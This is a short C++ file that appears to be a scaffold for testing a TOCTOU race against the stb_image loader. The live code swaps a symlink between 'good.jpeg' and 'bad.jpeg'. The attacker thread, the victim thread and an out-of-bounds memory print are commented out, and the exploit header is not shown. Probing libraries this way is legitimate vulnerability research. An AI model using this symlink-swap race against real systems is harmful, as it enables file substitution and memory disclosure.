#include <iostream>
#include <thread>
#include "exployt.hh"
#include "unistd.h"
#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"

int main(int argc, char** argv) {
    // initialize the Exployt object
    //Exployt xxx;

    // flag is only for debugging purpose
    //xxx.set_flag(0xFFFF);
    //if (argc > 1)
        //xxx.set_flag(atoi(argv[1]));
    //std::cout << std::hex << xxx.get_flag() << std::endl;

    //std::thread attac(&Exployt::exployt_toctou, &xxx);
    char goodfile[] = "good.jpeg";
    //char goodfile[] = "test.symlink";
    char badfile[] = "bad.jpeg";

    if (symlink(badfile, goodfile)) {
        std::cout << "Symlink failed with ERRNO " << std::strerror(errno) << std::endl;
        unlink(badfile);
    }

    //int x = 100, y = 100, n = 3;
    //std::thread vict(stbi_load, goodfile, &x, &y, &n, 0);
    //unsigned char* res = stbi_load(badfile, &x, &y, &n, 0);

    //std::cout << res << std::endl;
    //printf("%.*s\n", 2000, res+10000000);

    //stbi_image_free(res);

    //attac.join();
    //vict.join();
    
    return 0;
}
